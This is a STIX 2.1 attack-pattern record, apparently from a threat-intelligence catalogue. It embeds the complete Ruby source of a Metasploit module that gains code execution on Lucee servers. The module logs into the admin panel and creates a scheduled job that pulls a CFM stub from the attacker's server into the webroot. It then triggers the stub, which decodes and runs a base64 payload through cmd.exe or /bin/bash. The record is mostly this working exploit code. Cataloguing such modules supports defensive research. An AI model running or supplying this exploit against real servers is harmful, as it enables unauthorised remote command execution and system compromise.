{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2dd03297-800b-4749-b3af-b25dad8fcc40",
    "created": "2024-08-14T17:10:26.628654Z",
    "modified": "2024-08-14T17:10:26.628658Z",
    "name": "Lucee Authenticated Scheduled Job Code Execution",
    "description": " This module can be used to execute a payload on Lucee servers that have an exposed administrative web interface. It's possible for an administrator to create a scheduled job that queries a remote ColdFusion file, which is then downloaded and executed when accessed. The payload is uploaded as a cfm file when queried by the target server. When executed the payload will run as the user specified during the Lucee installation. On Windows, this is a service account; on Linux, it is either the root user or lucee.  'Targets' => [ [ 'Windows Command' { 'Platform' => 'win' 'Arch' => ARCH_CMD 'Type' => :windows_cmd  ] [ 'Unix Command' { 'Platform' => 'unix' 'Arch' => ARCH_CMD 'Type' => :unix_cmd  ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/lucee_scheduled_job.rb",
            "external_id": "lucee_scheduled_job.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.lucee.org/"
        },
        {
            "source_name": "reference",
            "url": "https://docs.lucee.org/reference/tags/execute.html"
        },
        {
            "source_name": "reference",
            "url": "https://docs.lucee.org/reference/tags/script.html"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Retry\n  include Msf::Exploit::FileDropper\n  require 'base64'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Lucee Authenticated Scheduled Job Code Execution',\n        'Description' => %q{\n          This module can be used to execute a payload on Lucee servers that have an exposed\n          administrative web interface. It's possible for an administrator to create a\n          scheduled job that queries a remote ColdFusion file, which is then downloaded and executed\n          when accessed. The payload is uploaded as a cfm file when queried by the target server. When executed,\n          the payload will run as the user specified during the Lucee installation. On Windows, this is a service account;\n          on Linux, it is either the root user or lucee.\n        },\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_cmd\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ]\n        ],\n        'Author' => 'Alexander Philiotis', # aphiliotis@synercomm.com\n        'License' => MSF_LICENSE,\n        'References' => [\n          # This abuses the functionality inherent to the Lucee platform and\n          # thus is not related to any CVEs.\n\n          # Lucee Docs\n          ['URL', 'https://docs.lucee.org/'],\n\n          # cfexecute & cfscript documentation\n          ['URL', 'https://docs.lucee.org/reference/tags/execute.html'],\n          ['URL', 'https://docs.lucee.org/reference/tags/script.html'],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            # /opt/lucee/server/lucee-server/context/logs/application.log\n            # /opt/lucee/web/logs/exception.log\n            IOC_IN_LOGS,\n            ARTIFACTS_ON_DISK,\n            # ColdFusion files located at the webroot of the Lucee server\n            # C:/lucee/tomcat/webapps/ROOT/ by default on Windows\n            # /opt/lucee/tomcat/webapps/ROOT/ by default on Linux\n          ]\n        },\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'DisclosureDate' => '2023-02-10'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8888),\n        OptString.new('PASSWORD', [false, 'The password for the administrative interface']),\n        OptString.new('TARGETURI', [true, 'The path to the admin interface.', '/lucee/admin/web.cfm']),\n        OptInt.new('PAYLOAD_DEPLOY_TIMEOUT', [false, 'Time in seconds to wait for access to the payload', 20]),\n      ]\n    )\n    deregister_options('URIPATH')\n  end\n\n  def exploit\n    payload_base = rand_text_alphanumeric(8..16)\n    authenticate\n\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          print_status(\"Payload request received for #{req.uri} from #{cli.peerhost}\")\n          send_response(cli, cfm_stub)\n        end,\n        'Path' => '/' + payload_base + '.cfm'\n      }\n    })\n\n    #\n    # Create the scheduled job\n    #\n    create_job(payload_base)\n\n    #\n    # Execute the scheduled job and attempt to send a GET request to it.\n    #\n    execute_job(payload_base)\n    print_good('Exploit completed.')\n\n    #\n    # Removes the scheduled job\n    #\n    print_status('Removing scheduled job ' + payload_base)\n    cleanup_request = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'vars_get' => {\n        'action' => 'services.schedule'\n      },\n      'vars_post' => {\n        'row_1' => '1',\n        'name_1' => payload_base.to_s,\n        'mainAction' => 'delete'\n      }\n    })\n    if cleanup_request && cleanup_request.code == 302\n      print_good('Scheduled job removed.')\n    else\n      print_bad('Failed to remove scheduled job.')\n    end\n  end\n\n  def authenticate\n    auth = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'login_passwordweb' => datastore['PASSWORD'],\n        'lang' => 'en',\n        'rememberMe' => 's',\n        'submit' => 'submit'\n      }\n    })\n\n    unless auth\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n\n    unless auth.code == 200 && auth.body.include?('nav_Security')\n      fail_with(Failure::NoAccess, 'Unable to authenticate. Please double check your credentials and try again.')\n    end\n\n    print_good('Authenticated successfully')\n  end\n\n  def create_job(payload_base)\n    create_job = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true,\n      'vars_get' => {\n        'action' => 'services.schedule',\n        'action2' => 'create'\n      },\n      'vars_post' => {\n        'name' => payload_base,\n        'url' => get_uri.to_s,\n        'interval' => '3600',\n        'start_day' => '01',\n        'start_month' => '02',\n        'start_year' => '2023',\n        'start_hour' => '00',\n        'start_minute' => '00',\n        'start_second' => '00',\n        'run' => 'create'\n      }\n    })\n\n    fail_with(Failure::Unreachable, 'Could not connect to the web service') if create_job.nil?\n    fail_with(Failure::UnexpectedReply, 'Unable to create job') unless create_job.code == 302\n\n    print_good('Job ' + payload_base + ' created successfully')\n    job_file_path = file_path = webroot\n    fail_with(Failure::UnexpectedReply, 'Could not identify the web root') if job_file_path.blank?\n\n    case target['Type']\n    when :unix_cmd\n      file_path << '/'\n      job_file_path = \"#{job_file_path.gsub('/', '//')}//\"\n    when :windows_cmd\n      file_path << '\\\\'\n      job_file_path = \"#{job_file_path.gsub('\\\\', '\\\\\\\\')}\\\\\"\n    end\n    update_job = send_request_cgi({\n      'method' => 'POST',\n      'uri' => target_uri.path,\n      'keep_cookies' => true,\n      'vars_get' => {\n        'action' => 'services.schedule',\n        'action2' => 'edit',\n        'task' => create_job.headers['location'].split('=')[-1]\n      },\n      'vars_post' => {\n        'name' => payload_base,\n        'url' => get_uri.to_s,\n        'port' => datastore['SRVPORT'],\n        'timeout' => '50',\n        'username' => '',\n        'password' => '',\n        'proxyserver' => '',\n        'proxyport' => '',\n        'proxyuser' => '',\n        'proxypassword' => '',\n        'publish' => 'true',\n        'file' => \"#{job_file_path}#{payload_base}.cfm\",\n        'start_day' => '01',\n        'start_month' => '02',\n        'start_year' => '2023',\n        'start_hour' => '00',\n        'start_minute' => '00',\n        'start_second' => '00',\n        'end_day' => '',\n        'end_month' => '',\n        'end_year' => '',\n        'end_hour' => '',\n        'end_minute' => '',\n        'end_second' => '',\n        'interval_hour' => '1',\n        'interval_minute' => '0',\n        'interval_second' => '0',\n        'run' => 'update'\n      }\n    })\n\n    fail_with(Failure::Unreachable, 'Could not connect to the web service') if update_job.nil?\n    fail_with(Failure::UnexpectedReply, 'Unable to update job') unless update_job.code == 302 || update_job.code == 200\n    register_files_for_cleanup(\"#{file_path}#{payload_base}.cfm\")\n    print_good('Job ' + payload_base + ' updated successfully')\n  end\n\n  def execute_job(payload_base)\n    print_status(\"Executing scheduled job: #{payload_base}\")\n    job_execution = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'vars_get' => {\n        'action' => 'services.schedule'\n      },\n      'vars_post' => {\n        'row_1' => '1',\n        'name_1' => payload_base,\n        'mainAction' => 'execute'\n      }\n\n    })\n\n    fail_with(Failure::Unreachable, 'Could not connect to the web service') if job_execution.nil?\n    fail_with(Failure::Unknown, 'Unable to execute job') unless job_execution.code == 302 || job_execution.code == 200\n\n    print_good('Job ' + payload_base + ' executed successfully')\n\n    payload_response = nil\n    retry_until_truthy(timeout: datastore['PAYLOAD_DEPLOY_TIMEOUT']) do\n      print_status('Attempting to access payload...')\n      payload_response = send_request_cgi(\n        'uri' => '/' + payload_base + '.cfm',\n        'method' => 'GET'\n      )\n      payload_response.nil? || (payload_response && payload_response.code == 200 && payload_response.body.exclude?('Error')) || (payload_response.code == 500)\n    end\n\n    # Unix systems tend to return a 500 response code when executing a shell. Windows tends to return a nil response, hence the check for both.\n    fail_with(Failure::Unknown, 'Unable to execute payload') unless payload_response.nil? || payload_response.code == 200 || payload_response.code == 500\n\n    if payload_response.nil?\n      print_status('No response from ' + payload_base + '.cfm' + (session_created? ? '' : ' Check your listener!'))\n    elsif payload_response.code == 200\n      print_good('Received 200 response from ' + payload_base + '.cfm')\n      output = payload_response.body.strip\n      if output.include?(\"\\n\")\n        print_good('Output:')\n        print_line(output)\n      elsif output.present?\n        print_good('Output: ' + output)\n      end\n    elsif payload_response.code == 500\n      print_status('Received 500 response from ' + payload_base + '.cfm' + (session_created? ? '' : ' Check your listener!'))\n    end\n  end\n\n  def webroot\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n    return nil unless res\n\n    res.get_html_document.at('[text()*=\"Webroot\"]')&.next&.next&.text\n  end\n\n  def cfm_stub\n    case target['Type']\n    when :windows_cmd\n      <<~CFM.gsub(/^\\s+/, '').tr(\"\\n\", '')\n        <cfscript>\n            cfexecute(name=\"cmd.exe\", arguments=\"/c \" & toString(binaryDecode(\"#{Base64.strict_encode64(payload.encoded)}\", \"base64\")),timeout=5);\n        </cfscript>\n      CFM\n    when :unix_cmd\n      <<~CFM.gsub(/^\\s+/, '').tr(\"\\n\", '')\n        <cfscript>\n            cfexecute(name=\"/bin/bash\", arguments=[\"-c\", toString(binaryDecode(\"#{Base64.strict_encode64(payload.encoded)}\", \"base64\"))],timeout=5);\n        </cfscript>\n      CFM\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-02-10"
}